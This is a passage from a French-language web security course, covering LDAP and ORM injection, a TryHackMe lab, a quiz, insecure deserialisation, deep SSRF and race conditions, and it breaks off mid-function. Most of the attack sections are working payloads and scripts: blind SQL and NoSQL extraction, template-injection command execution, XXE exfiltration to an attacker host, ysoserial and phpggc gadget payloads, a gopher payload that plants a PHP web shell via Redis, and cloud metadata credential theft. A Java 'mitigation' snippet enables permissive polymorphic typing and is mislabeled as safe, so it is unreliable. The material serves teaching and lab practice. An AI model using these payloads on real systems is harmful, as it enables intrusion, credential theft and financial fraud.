LDAP (Lightweight Directory Access Protocol) est un protocole utilisé pour accéder à des services d'annuaire.

##### Bases de LDAP

LDAP organise les informations dans une structure arborescente :

```
dc=example,dc=com                 (Racine)
├── ou=Users                      (Unité organisationnelle)
│   ├── uid=john,ou=Users,dc=example,dc=com
│   └── uid=alice,ou=Users,dc=example,dc=com
└── ou=Groups                     (Unité organisationnelle)
    ├── cn=admins,ou=Groups,dc=example,dc=com
    └── cn=users,ou=Groups,dc=example,dc=com
```

Les filtres LDAP permettent de rechercher des entrées :

```
(uid=john)                        # Utilisateur avec uid "john"
(&(uid=john)(objectClass=person)) # Utilisateur "john" de classe "person"
(|(uid=john)(uid=alice))          # Utilisateur "john" OU "alice"
```

##### Vulnérabilités d'injection LDAP

Les injections LDAP se produisent lorsque les entrées utilisateur sont utilisées pour construire des filtres LDAP sans validation adéquate.

**Code vulnérable (PHP)** :

```php
$username = $_POST['username'];
$password = $_POST['password'];

$filter = "(&(uid=$username)(userPassword=$password))";
$result = ldap_search($ldap_conn, $base_dn, $filter);
```

##### Techniques d'exploitation

1. **Authentification bypass** :

```
# Entrée normale
username: john
password: secret

# Filtre résultant
(&(uid=john)(userPassword=secret))

# Injection
username: *)(objectClass=*
password: anything

# Filtre résultant
(&(uid=*)(objectClass=*)(userPassword=anything))
```

Ce filtre retourne tous les utilisateurs car `(objectClass=*)` correspond à toutes les entrées.

2. **Injection avec opérateurs logiques** :

```
# Injection
username: john)(|(objectClass=*
password: anything

# Filtre résultant
(&(uid=john)(|(objectClass=*)(userPassword=anything)))
```

Ce filtre retourne l'utilisateur "john" sans vérifier le mot de passe.

3. **Extraction d'informations** :

```
# Injection pour tester si le mot de passe commence par 'a'
username: john)(userPassword=a*
password: anything

# Filtre résultant
(&(uid=john)(userPassword=a*)(userPassword=anything))
```

Si ce filtre retourne un résultat, le mot de passe commence par 'a'.

##### Contournement de filtres

1. **Encodage Unicode** :

```
# Si les caractères spéciaux sont filtrés
username: john\29\28\7c\28objectClass\3d\2a
```

2. **Caractères NULL** :

```
# Si la validation s'arrête au premier NULL
username: john)%00
```

#### ORM Injection

Les ORM (Object-Relational Mapping) sont des bibliothèques qui facilitent l'interaction entre les applications et les bases de données.

##### Vulnérabilités dans les ORM

Même si les ORM sont censés protéger contre les injections SQL, ils peuvent introduire leurs propres vulnérabilités :

**Code vulnérable (Python avec SQLAlchemy)** :

```python
# Vulnérable à l'injection
username = request.args.get('username')
query = f"username = '{username}'"
user = session.query(User).filter(text(query)).first()

# Sécurisé
username = request.args.get('username')
user = session.query(User).filter(User.username == username).first()
```

##### Techniques d'exploitation

1. **Injection dans les requêtes dynamiques** :

```python
# Code vulnérable
order_column = request.args.get('order', 'id')
users = session.query(User).order_by(text(order_column)).all()

# Exploitation
order_column = "id) UNION SELECT username, password FROM users --"
```

2. **Injection dans les filtres** :

```python
# Code vulnérable
filter_str = request.args.get('filter', '')
products = session.query(Product).filter(text(f"category = '{filter_str}'")).all()

# Exploitation
filter_str = "' OR 1=1 --"
```

3. **Exploitation de fonctions spécifiques aux ORM** :

```python
# Django ORM vulnérable
username = request.GET.get('username')
users = User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")

# Exploitation
username = "' UNION SELECT 1, username, password, 1, 1, 1, 1 FROM auth_user --"
```

#### Prévention des injections LDAP et ORM

##### Prévention des injections LDAP

1. **Échappement des caractères spéciaux** :

```php
function ldap_escape($value) {
    // Caractères à échapper: * ( ) \ NUL
    $value = str_replace('\\', '\\5c', $value);
    $value = str_replace('*', '\\2a', $value);
    $value = str_replace('(', '\\28', $value);
    $value = str_replace(')', '\\29', $value);
    $value = str_replace('\0', '\\00', $value);
    return $value;
}

$username = ldap_escape($_POST['username']);
$filter = "(&(uid=$username)(objectClass=person))";
```

2. **Utilisation de fonctions de binding** :

```php
// Au lieu de construire un filtre
$username = $_POST['username'];
$password = $_POST['password'];

// Utiliser le binding LDAP
$dn = "uid=$username,ou=Users,dc=example,dc=com";
$result = ldap_bind($ldap_conn, $dn, $password);
```

##### Prévention des injections ORM

1. **Utiliser les méthodes paramétrées des ORM** :

```python
# SQLAlchemy sécurisé
username = request.args.get('username')
user = session.query(User).filter(User.username == username).first()

# Django sécurisé
username = request.GET.get('username')
users = User.objects.filter(username=username)
```

2. **Valider les entrées pour les ordres et filtres dynamiques** :

```python
# Validation des colonnes de tri
allowed_columns = ['id', 'name', 'created_at']
order_column = request.args.get('order', 'id')
if order_column not in allowed_columns:
    order_column = 'id'
users = session.query(User).order_by(order_column).all()
```

3. **Éviter les requêtes SQL brutes** :

```python
# Éviter
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")

# Préférer
User.objects.filter(username=username)
```

**En clair, pour un débutant :**
L'injection LDAP, c'est comme l'injection SQL mais pour les annuaires d'entreprise. Au lieu d'injecter du SQL, vous injectez des filtres LDAP comme `*)(objectClass=*` pour contourner l'authentification. L'injection ORM est plus sournoise : même si vous utilisez un ORM pour éviter les injections SQL, vous pouvez créer de nouvelles vulnérabilités en construisant des requêtes dynamiques. C'est comme si vous remplaciez une serrure vulnérable par un système de sécurité plus moderne, mais en laissant une fenêtre ouverte à côté. La solution est toujours la même : ne jamais faire confiance aux entrées utilisateur et utiliser les mécanismes de paramétrage fournis par les bibliothèques.

### Mini-lab THM « Injectics »

Ce mini-lab vous guide à travers l'exploitation de diverses vulnérabilités d'injection avancées sur une machine TryHackMe.

#### Objectif

Explorer et exploiter différents types d'injections avancées pour récupérer des flags cachés et comprendre les mécanismes sous-jacents.

#### Préparation

1. **Accès à la machine** :
   - Connectez-vous à TryHackMe
   - Déployez la machine "Injectics"
   - Notez l'adresse IP attribuée

2. **Configuration de l'environnement** :
   - Préparez Burp Suite pour l'interception
   - Créez des répertoires pour organiser vos notes et résultats

#### Partie 1 : Injection SQL avancée

1. **Reconnaissance initiale** :
   - Explorez l'application web pour identifier les points d'entrée
   - Localisez la fonctionnalité de recherche de produits

2. **Détection d'injection SQL basée sur le temps** :
   ```
   # Test d'injection basée sur le temps
   ' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
   ```

3. **Extraction de données** :
   ```
   # Script d'extraction automatisée
   import requests
   import time
   
   url = "http://MACHINE_IP/search"
   
   def extract_data(query, length=20):
       result = ""
       for pos in range(1, length + 1):
           for char in range(32, 127):  # ASCII imprimables
               payload = f"' OR (SELECT CASE WHEN (ASCII(SUBSTRING(({query}),{pos},1))={char}) THEN pg_sleep(2) ELSE pg_sleep(0) END) --"
               
               params = {"q": payload}
               start_time = time.time()
               response = requests.get(url, params=params)
               request_time = time.time() - start_time
               
               if request_time > 1.5:  # Seuil de détection
                   result += chr(char)
                   print(f"Position {pos}: {chr(char)}")
                   break
           
           if len(result) < pos:  # Aucun caractère trouvé à cette position
               break
       
       return result
   
   # Extraction du flag
   flag = extract_data("SELECT flag FROM flags WHERE id=1")
   print(f"Flag: {flag}")
   ```

4. **Exploitation de requêtes empilées** :
   ```
   # Création d'une table temporaire
   '; CREATE TABLE temp_data (data TEXT); INSERT INTO temp_data VALUES ('compromised'); --
   
   # Vérification
   '; SELECT * FROM temp_data; --
   ```

#### Partie 2 : NoSQL Injection

1. **Localisation de l'API MongoDB** :
   - Identifiez l'endpoint d'API utilisant MongoDB
   - Testez des injections basiques

2. **Bypass d'authentification** :
   ```
   # Requête POST avec payload JSON
   POST /api/login HTTP/1.1
   Content-Type: application/json
   
   {
     "username": {"$ne": null},
     "password": {"$ne": null}
   }
   ```

3. **Extraction de données avec $regex** :
   ```python
   import requests
   import string
   
   url = "http://MACHINE_IP/api/users"
   valid_chars = string.ascii_letters + string.digits + "_-{}"
   
   def extract_flag():
       flag = ""
       while True:
           found = False
           for char in valid_chars:
               payload = {
                   "username": "admin",
                   "flag": {"$regex": f"^{flag}{char}"}
               }
               
               response = requests.post(url, json=payload)
               
               if "User found" in response.text:
                   flag += char
                   found = True
                   print(f"Flag so far: {flag}")
                   break
           
           if not found:
               break
       
       return flag
   
   flag = extract_flag()
   print(f"Complete flag: {flag}")
   ```

#### Partie 3 : XXE Injection

1. **Identification du point d'entrée XML** :
   - Localisez la fonctionnalité d'import/export XML
   - Testez une XXE basique

2. **Lecture de fichiers locaux** :
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE data [
     <!ENTITY file SYSTEM "file:///etc/passwd">
   ]>
   <import>
     <data>&file;</data>
   </import>
   ```

3. **Exploitation Out-of-Band** :
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE data [
     <!ENTITY % file SYSTEM "file:///flag.txt">
     <!ENTITY % dtd SYSTEM "http://YOUR_IP:8000/evil.dtd">
     %dtd;
   ]>
   <import>
     <data>test</data>
   </import>
   ```

   Contenu de evil.dtd (à servir depuis votre machine) :
   ```xml
   <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://YOUR_IP:8000/?flag=%file;'>">
   %all;
   %exfil;
   ```

4. **Configuration du serveur d'écoute** :
   ```bash
   # Servir le fichier DTD
   python3 -m http.server 8000
   
   # Dans un autre terminal, surveiller les requêtes
   nc -lvnp 8000
   ```

#### Partie 4 : Template Injection

1. **Identification du moteur de template** :
   - Testez différentes syntaxes pour identifier le moteur
   ```
   {{7*7}}      # Test Jinja2/Twig
   ${7*7}       # Test FreeMarker
   <%= 7*7 %>   # Test ERB
   ```

2. **Exploitation de Jinja2** :
   ```
   # Vérification de la classe
   {{ ''.__class__.__mro__ }}
   
   # Recherche de classes utiles
   {% for c in ''.__class__.__mro__[1].__subclasses__() %}
     {{ c.__name__ }}
   {% endfor %}
   
   # Exécution de commandes
   {% for c in ''.__class__.__mro__[1].__subclasses__() %}
     {% if c.__name__ == 'Popen' %}
       {{ c(['cat', '/flag3.txt'], stdout=-1).communicate()[0].decode() }}
     {% endif %}
   {% endfor %}
   ```

#### Partie 5 : ORM Injection

1. **Identification de l'API utilisant un ORM** :
   - Localisez l'endpoint d'API avec des paramètres de filtrage ou de tri

2. **Test d'injection dans les paramètres de tri** :
   ```
   # URL normale
   /api/products?sort=price
   
   # URL injectée
   /api/products?sort=price) UNION ALL SELECT username, password, NULL, NULL FROM users --
   ```

3. **Exploitation via Burp Suite** :
   - Interceptez la requête avec Burp
   - Modifiez les paramètres pour injecter du SQL
   - Analysez la réponse pour extraire des données sensibles

#### Rapport et réflexion

Pour chaque vulnérabilité exploitée, documentez :
1. La vulnérabilité identifiée
2. La méthode d'exploitation
3. L'impact dans un environnement réel
4. Les mesures de correction recommandées

**Exemple de rapport pour la partie 3 (XXE Injection) :**
```
Vulnérabilité : Injection d'entités XML externes (XXE)
Méthode d'exploitation : Utilisation d'entités externes pour lire des fichiers locaux et exfiltrer des données via OOB
Impact : Accès non autorisé à des fichiers sensibles, possibilité de scan de ports internes et d'attaques SSRF
Correction : Désactiver les entités externes dans le parseur XML, utiliser des formats alternatifs comme JSON
```

**En clair, pour un débutant :**
Ce mini-lab est comme un parcours d'obstacles centré sur les injections avancées. Vous commencez par une injection SQL basée sur le temps, où vous devez chronométrer les réponses pour extraire des données invisibles. Ensuite, vous exploitez une API MongoDB en injectant des opérateurs spéciaux comme `$ne` et `$regex`. Puis, vous manipulez du XML pour forcer le serveur à lire des fichiers et à envoyer leur contenu à votre machine. Vous continuez avec une injection de template pour exécuter du code arbitraire, et terminez par une injection ORM qui montre que même les couches d'abstraction peuvent être vulnérables. C'est un entraînement complet aux techniques d'injection modernes dans un environnement contrôlé.

### Quiz

1. **Quelle technique d'injection SQL permet d'extraire des données même lorsque les résultats ne sont pas visibles dans la réponse ?**
   - A) UNION injection
   - B) Error-based injection
   - C) Time-based injection
   - D) Stacked queries
   
   *Réponse : C) Time-based injection*

2. **Quel opérateur MongoDB est couramment utilisé pour contourner l'authentification dans les injections NoSQL ?**
   - A) $eq
   - B) $ne
   - C) $gt
   - D) $regex
   
   *Réponse : B) $ne*

3. **Quelle technique XXE permet d'exfiltrer des données même lorsque les résultats ne sont pas visibles dans la réponse ?**
   - A) Entity expansion
   - B) Out-of-Band (OOB) exfiltration
   - C) XML comment injection
   - D) DTD overriding
   
   *Réponse : B) Out-of-Band (OOB) exfiltration*

4. **Dans une injection de template Jinja2, quelle expression permet d'accéder aux classes Python sous-jacentes ?**
   - A) {{ request.args }}
   - B) {{ config.items() }}
   - C) {{ ''.__class__.__mro__ }}
   - D) {{ self.env.globals }}
   
   *Réponse : C) {{ ''.__class__.__mro__ }}*

5. **Quelle est la meilleure pratique pour prévenir les injections ORM ?**
   - A) Utiliser des requêtes SQL brutes
   - B) Désactiver les fonctionnalités avancées de l'ORM
   - C) Utiliser les méthodes paramétrées natives de l'ORM
   - D) Encoder manuellement toutes les entrées utilisateur
   
   *Réponse : C) Utiliser les méthodes paramétrées natives de l'ORM*
## PARTIE F — Niveau Avancé 4 : Server-Side Attacks

### Insecure Deserialisation (Java / PHP)

La désérialisation non sécurisée est une vulnérabilité qui se produit lorsqu'une application désérialise des données contrôlées par l'attaquant sans vérification adéquate.

#### Comprendre la sérialisation et désérialisation

La sérialisation est le processus de conversion d'un objet en un format qui peut être stocké ou transmis (comme une chaîne de caractères ou un flux binaire). La désérialisation est le processus inverse.

##### Exemple en PHP

```php
// Sérialisation
$user = new User();
$user->name = "Alice";
$user->role = "user";
$serialized = serialize($user);
// Résultat: O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:4:"user";}

// Désérialisation
$user = unserialize($serialized);
```

##### Exemple en Java

```java
// Sérialisation
User user = new User();
user.setName("Alice");
user.setRole("user");
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(user);
byte[] serializedData = baos.toByteArray();
// Résultat: données binaires

// Désérialisation
ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
ObjectInputStream ois = new ObjectInputStream(bais);
User user = (User) ois.readObject();
```

#### Vulnérabilités de désérialisation

##### Mécanismes d'exploitation

La désérialisation non sécurisée peut être exploitée de plusieurs façons :

1. **Manipulation d'objets** : Modifier les attributs d'objets sérialisés
2. **Injection de gadgets** : Utiliser des chaînes de gadgets pour exécuter du code
3. **Exploitation de méthodes magiques** : Abus de méthodes comme `__wakeup()` en PHP

##### Exploitation en PHP

PHP utilise un format de sérialisation lisible par l'homme, ce qui facilite la manipulation :

```
O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:4:"user";}
```

**Manipulation d'attributs** :

```php
// Original
O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:4:"user";}

// Modifié pour élever les privilèges
O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";}
```

**Exploitation de méthodes magiques** :

```php
// Classe vulnérable
class FileManager {
    public $filename;
    
    function __wakeup() {
        // Exécuté automatiquement lors de la désérialisation
        file_get_contents($this->filename);
    }
}

// Payload malveillant
O:11:"FileManager":1:{s:8:"filename";s:17:"php://filter/read=convert.base64-encode/resource=/etc/passwd";}
```

**Exécution de code avec POP chains** :

```php
// Utilisation de phpggc pour générer un payload
$ phpggc Monolog/RCE1 system 'cat /etc/passwd' -s
```

##### Exploitation en Java

Java utilise un format binaire pour la sérialisation, ce qui nécessite des outils spécialisés :

**Utilisation de ysoserial** :

```bash
# Génération d'un payload pour exécuter une commande
$ java -jar ysoserial.jar CommonsCollections5 'whoami' > payload.bin

# Envoi du payload
$ curl -X POST --data-binary @payload.bin http://vulnerable-site.com/endpoint
```

**Chaînes de gadgets courantes** :

- **CommonsCollections** : Exploite Apache Commons Collections
- **Spring** : Exploite le framework Spring
- **Groovy** : Exploite le runtime Groovy
- **ROME** : Exploite la bibliothèque ROME RSS/Atom

#### Détection des vulnérabilités

##### Identification des points d'entrée

Recherchez les points où l'application pourrait désérialiser des données :

1. **Cookies** : Souvent encodés en Base64
2. **Paramètres cachés** : Champs de formulaire masqués
3. **Jetons JWT** : Peuvent contenir des objets sérialisés
4. **Fichiers uploadés** : Peuvent contenir des données sérialisées
5. **Flux binaires** : Dans les API REST ou WebSockets

##### Signatures de sérialisation

- **PHP** : Commence souvent par `O:` (objet), `a:` (tableau), `s:` (chaîne)
- **Java** : Commence par `AC ED 00 05` en hexadécimal ou `rO0` en Base64
- **Python** : Formats pickle ou marshal
- **.NET** : Formats BinaryFormatter ou JSON.NET

#### Outils spécialisés

##### Pour PHP

```bash
# phpggc - PHP Generic Gadget Chains
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Lister les gadgets disponibles
php phpggc.php -l

# Générer un payload
php phpggc.php Monolog/RCE1 system 'cat /etc/passwd'
```

##### Pour Java

```bash
# ysoserial - Java Deserialization Exploitation Tool
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar

# Lister les gadgets disponibles
java -jar ysoserial.jar

# Générer un payload
java -jar ysoserial.jar CommonsCollections5 'cat /etc/passwd' > payload.bin
```

#### Prévention et mitigation

##### Approches générales

1. **Éviter la désérialisation de données non fiables**
2. **Utiliser des formats alternatifs** (JSON, YAML) avec validation de schéma
3. **Implémenter des vérifications d'intégrité** (HMAC)
4. **Appliquer le principe du moindre privilège**

##### Solutions spécifiques pour PHP

```php
// Utiliser le second paramètre de unserialize() pour limiter les classes
$allowedClasses = ['SafeClass1', 'SafeClass2'];
$obj = unserialize($data, ['allowed_classes' => $allowedClasses]);

// Alternative: JSON au lieu de serialize/unserialize
$json = json_encode($obj);
$obj = json_decode($json);
```

##### Solutions spécifiques pour Java

```java
// Utiliser ValidatingObjectInputStream
ValidatingObjectInputStream vois = new ValidatingObjectInputStream(inputStream);
vois.accept(SafeClass1.class, SafeClass2.class);
SafeClass1 obj = (SafeClass1) vois.readObject();

// Alternative: Jackson avec polymorphisme désactivé
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
);
```

**En clair, pour un débutant :**
La désérialisation non sécurisée, c'est comme recevoir un colis piégé. Normalement, la sérialisation permet de "congeler" un objet pour le stocker ou l'envoyer, et la désérialisation le "décongèle". Mais si un attaquant modifie le colis avant qu'il ne soit "décongelé", il peut y glisser des instructions malveillantes qui s'exécuteront automatiquement. En PHP, c'est particulièrement dangereux car le format est lisible et facilement modifiable (comme un colis avec une étiquette claire). En Java, c'est plus complexe mais des outils comme ysoserial permettent de créer des "colis piégés" prêts à l'emploi qui exploitent des bibliothèques courantes.

### Deep SSRF (gopher, redis)

Le Server-Side Request Forgery (SSRF) avancé, ou "Deep SSRF", exploite des protocoles alternatifs et des services internes pour des attaques plus sophistiquées.

#### Rappel sur le SSRF basique

Le SSRF basique force le serveur à effectuer des requêtes HTTP vers des cibles non prévues :

```
https://example.com/fetch?url=http://internal-service:8080/admin
```

#### Protocoles alternatifs pour SSRF avancé

##### Le protocole file://

Permet d'accéder aux fichiers locaux du serveur :

```
https://example.com/fetch?url=file:///etc/passwd
```

##### Le protocole gopher://

Gopher est un protocole polyvalent qui permet d'interagir avec divers services :

```
gopher://host:port/gopher-path
```

Le chemin gopher commence par un type de ressource (1 caractère) suivi du contenu :

- `0` : Fichier texte
- `1` : Répertoire
- `9` : Fichier binaire
- etc.

##### Le protocole dict://

Permet d'interagir avec des serveurs DICT :

```
https://example.com/fetch?url=dict://internal-server:2628/info:
```

#### Exploitation de services internes avec Gopher

##### Exploitation de Redis

Redis est un stockage clé-valeur souvent utilisé sans authentification sur les réseaux internes.

**Commandes Redis basiques** :

```
SET key value
GET key
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE
```

**Exploitation via Gopher** :

```
gopher://redis-server:6379/_
SET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0A
CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A
CONFIG%20SET%20dbfilename%20shell.php%0D%0A
SAVE%0D%0A
```

Notez que chaque commande doit être suivie de `\r\n` (encodé en URL comme `%0D%0A`).

##### Exploitation de Memcached

Memcached est un système de cache distribué souvent utilisé sans authentification.

**Commandes Memcached basiques** :

```
stats
get key
set key 0 3600 5
value
```

**Exploitation via Gopher** :

```
gopher://memcached-server:11211/_stats%0D%0A
```

##### Exploitation de services SMTP

Permet d'envoyer des emails non autorisés :

```
gopher://smtp-server:25/_HELO%20example.com%0D%0AMAIL%20FROM%3A%3Cattacker%40example.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20Compromised%0D%0A%0D%0AThis%20server%20has%20been%20compromised.%0D%0A.%0D%0AQUIT%0D%0A
```

#### Techniques avancées d'exploitation

##### Scan de ports internes

Utilisation du SSRF pour scanner les ports internes :

```python
import requests
import time

def scan_port(target_ip, port):
    url = f"https://vulnerable-site.com/fetch?url=http://{target_ip}:{port}"
    start_time = time.time()
    response = requests.get(url)
    request_time = time.time() - start_time
    
    # Analyse basée sur le temps de réponse ou le code d'état
    if request_time < 1.0 and response.status_code == 500:
        print(f"Port {port} is closed")
    else:
        print(f"Port {port} is open")

# Exemple d'utilisation
for port in range(1, 10000):
    scan_port("192.168.1.1", port)
```

##### Pivoting vers d'autres réseaux

Utilisation du SSRF pour atteindre des réseaux normalement inaccessibles :

```
# Accès à un réseau interne via un serveur compromis
https://vulnerable-site.com/fetch?url=http://192.168.0.1
```

##### Exploitation de métadonnées cloud

Les services cloud exposent des métadonnées via des endpoints spécifiques :

```
# AWS
https://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
https://vulnerable-site.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud
https://vulnerable-site.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### Contournement des protections

##### Contournement des filtres d'URL

1. **Encodage d'URL** :
   ```
   https://vulnerable-site.com/fetch?url=http%3A%2F%2Finternal-server
   ```

2. **Double encodage** :
   ```
   https://vulnerable-site.com/fetch?url=http%253A%252F%252Finternal-server
   ```

3. **Représentations alternatives d'adresses IP** :
   ```
   # Décimal
   http://2130706433/ (équivalent à 127.0.0.1)
   
   # Hexadécimal
   http://0x7f000001/ (équivalent à 127.0.0.1)
   
   # Octal
   http://0177.0.0.01/ (équivalent à 127.0.0.1)
   ```

##### Contournement des validations de domaine

1. **Utilisation de sous-domaines** :
   ```
   https://vulnerable-site.com/fetch?url=http://internal-server.attacker.com
   ```

2. **Utilisation de redirections** :
   ```
   # Redirection depuis un domaine autorisé vers une cible interne
   https://vulnerable-site.com/fetch?url=https://trusted-site.com/redirect?to=http://internal-server
   ```

3. **Utilisation de DNS rebinding** :
   - Configurer un domaine pour qu'il renvoie alternativement l'adresse d'un serveur légitime et celle d'un serveur interne
   - La première requête DNS passe la validation
   - La seconde requête DNS (après expiration du TTL) pointe vers la cible interne

#### Outils spécialisés

##### Gopherus

Gopherus génère automatiquement des payloads Gopher pour différents services :

```bash
# Installation
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x gopherus.py

# Utilisation pour Redis
python gopherus.py --exploit redis --command "system('cat /etc/passwd')" --lhost 127.0.0.1 --lport 6379

# Utilisation pour MySQL
python gopherus.py --exploit mysql --username root --password root
```

##### SSRFmap

SSRFmap est un outil pour tester et exploiter les vulnérabilités SSRF :

```bash
# Installation
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# Utilisation basique
python ssrfmap.py -r data/request.txt -p url -m readfiles
```

#### Prévention et mitigation

##### Validation stricte des entrées

```python
import re
import urllib.parse

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    
    # Vérifier le schéma
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Vérifier le domaine contre une liste blanche
    whitelist = ['api.example.com', 'cdn.example.com']
    if parsed.netloc not in whitelist:
        return False
    
    # Bloquer les adresses IP
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', parsed.netloc):
        return False
    
    return True
```

##### Utilisation de listes blanches de domaines et d'IPs

```python
def is_allowed_target(hostname, ip):
    # Liste blanche de domaines
    allowed_domains = ['api.example.com', 'cdn.example.com']
    if hostname in allowed_domains:
        return True
    
    # Liste blanche d'IPs
    allowed_ips = ['192.168.1.2', '192.168.1.3']
    if ip in allowed_ips:
        return True
    
    # Bloquer les adresses privées
    private_ranges = [
        ('127.0.0.0', '127.255.255.255'),
        ('10.0.0.0', '10.255.255.255'),
        ('172.16.0.0', '172.31.255.255'),
        ('192.168.0.0', '192.168.255.255')
    ]
    
    for start, end in private_ranges:
        if ip_in_range(ip, start, end):
            return False
    
    return False
```

##### Architecture sécurisée

1. **Utilisation d'un proxy dédié** :
   - Toutes les requêtes passent par un proxy qui applique des règles strictes
   - Le proxy n'a accès qu'aux ressources nécessaires

2. **Segmentation réseau** :
   - Isoler les services critiques dans des segments réseau distincts
   - Utiliser des pare-feu pour limiter les communications entre segments

**En clair, pour un débutant :**
Le SSRF avancé, c'est comme si vous demandiez à un employé d'aller chercher un document sur internet, mais au lieu de lui donner une URL web normale, vous lui donnez des instructions spéciales (comme "gopher://") qui lui font exécuter des actions complètement différentes. Par exemple, avec le protocole gopher, vous pouvez envoyer des commandes à une base de données Redis interne pour créer un fichier malveillant. C'est particulièrement dangereux car ces services internes (Redis, Memcached, SMTP) sont souvent configurés sans authentification, partant du principe que personne de l'extérieur ne peut y accéder directement.

### Race Conditions (deposit example)

Les conditions de course (race conditions) sont des vulnérabilités qui se produisent lorsque le comportement d'un système dépend de la séquence ou du timing d'événements incontrôlables.

#### Comprendre les conditions de course

Une condition de course se produit lorsque plusieurs processus accèdent et manipulent les mêmes données simultanément, et que le résultat dépend de l'ordre exact dans lequel ces opérations sont exécutées.

##### Exemple simple

Considérons une fonction de retrait bancaire :

```python
def withdraw(account_id, amount):
    # 1. Lire le solde actuel
    current_balance = get_balance(account_id)
    
    # 2. Vérifier si le solde est suffisant
    if current_balance >= amount:
        # 3. Calculer le nouveau solde
        new_balance = current_balance - amount
        
        # 4. Mettre à jour le solde
        update_balance(account_id, new_balance)
        
        return True
    else:
        return False
```

Si deux opérations de retrait sont exécutées simultanément, elles pourraient toutes deux lire le solde initial avant que l'une d'elles ne mette à jour la base de données, permettant potentiellement de retirer plus d'argent que disponible.

#### Types de conditions de course

##### Time-of-check to time-of-use (TOCTOU)

Ce type de condition de course se produit lorsqu'il y a un délai entre la vérification d'une condition et l'utilisation du résultat de cette vérification.

**Exemple avec des fichiers** :

```python
# Vérification
if os.path.exists(filename) and not os.path.islink(filename):
    # Utilisation (potentiellement après un changement)
    with open(filename, 'r') as f:
        data = f.read()
```

Entre la vérification et l'utilisation, le fichier pourrait être remplacé par un lien symbolique vers un fichier sensible.

##### Conditions de course dans les applications web

Dans les applications web, les conditions de course peuvent affecter :

1. **Opérations financières** (double dépôt, double retrait)
2. **Gestion des ressources** (réservation de places, allocation de ressources)
3. **Contrôles d'accès** (vérification de permissions)
4. **Opérations de fichiers** (upload, suppression)

#### Exemple détaillé : Double dépôt

##### Scénario vulnérable

Considérons une application de portefeuille électronique avec une fonction de dépôt :

```php
// Fonction de dépôt vulnérable
function deposit($user_id, $amount, $transaction_id) {
    // 1. Vérifier si la transaction a déjà été traitée
    $result = $db->query("SELECT * FROM transactions WHERE transaction_id = '$transaction_id'");
    if ($result->num_rows > 0) {
        return "Transaction déjà traitée";
    }
    
    // 2. Obtenir le solde actuel
    $result = $db->query("SELECT balance FROM users WHERE id = $user_id");
    $row = $result->fetch_assoc();
    $current_balance = $row['balance'];
    
    // 3. Calculer le nouveau solde
    $new_balance = $current_balance + $amount;
    
    // 4. Mettre à jour le solde
    $db->query("UPDATE users SET balance = $new_balance WHERE id = $user_id");
    
    // 5. Enregistrer la transaction
    $db->query("INSERT INTO transactions (transaction_id, user_id, amount) VALUES ('$transaction_id', $user_id, $amount)");
    
    return "Dépôt réussi";
}
```

##### Exploitation

Un attaquant peut exploiter cette vulnérabilité en envoyant plusieurs requêtes simultanées avec le même ID de transaction :

```python
import requests
import threading

def exploit_race_condition():
    url = "https://vulnerable-site.com/deposit"
    data = {
        "user_id": 123,
        "amount": 100,
        "transaction_id": "UNIQUE_ID_123"
    }
    
    # Créer et démarrer plusieurs threads pour envoyer des requêtes simultanées
    threads = []
    for i in range(10):
        t = threading.Thread(target=lambda: requests.post(url, data=data))
        threads.append(t)
        t.start()
    
    # Attendre que tous les threads terminent
    for t in threads:
        t.join()

# Exécuter l'exploit
exploit_race_condition()
```

Si l'application est vulnérable, plusieurs dépôts pourraient être traités pour une seule transaction.

#### Techniques d'exploitation avancées

##### Utilisation de Turbo Intruder

Burp Suite Turbo Intruder est un outil efficace pour exploiter les conditions de course :

```python
# Script Turbo Intruder pour exploiter une condition de course
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)
    
    # Préparer la requête
    request = '''POST /deposit HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

user_id=123&amount=100&transaction_id=UNIQUE_ID_123'''
    
    # Envoyer de nombreuses requêtes simultanées
    for i in range(50):
        engine.queue(request)

def handleResponse(req, interesting):
    # Analyser les réponses si nécessaire
    if '200 OK' in req.response:
        table.add(req)
```

##### Exploitation de fenêtres temporelles

Certaines conditions de course nécessitent d'exploiter des fenêtres temporelles précises :

```python
import requests
import time
import threading

def trigger_vulnerable_action():
    requests.get("https://vulnerable-site.com/start_process")

def exploit_during_process():
